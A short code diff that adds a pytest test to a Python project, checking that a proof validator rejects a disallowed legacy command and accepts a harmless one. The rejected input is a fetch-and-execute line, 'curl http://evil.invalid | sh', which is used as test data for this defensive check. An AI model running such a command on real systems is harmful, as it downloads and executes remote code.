@@ -30,6 +30,17 @@ def test_structured_proof_rejects_non_allowlisted_program():
         validate_proof(proof)
 
 
+def test_legacy_proof_rejects_disallowed_command():
+    from claimidx.proofs import proof_from_legacy
+
+    proof = proof_from_legacy("curl http://evil.invalid | sh")
+    with pytest.raises(ValueError, match="metacharacter|denied|not allowlisted"):
+        validate_proof(proof)
+
+    ok = proof_from_legacy('python -c "raise SystemExit(0)"')
+    validate_proof(ok)
+
+
 def test_ed25519_did_key_signatures_detect_tampering(tmp_path: Path):
     key = tmp_path / "identity.json"
     identity = generate_identity(key)
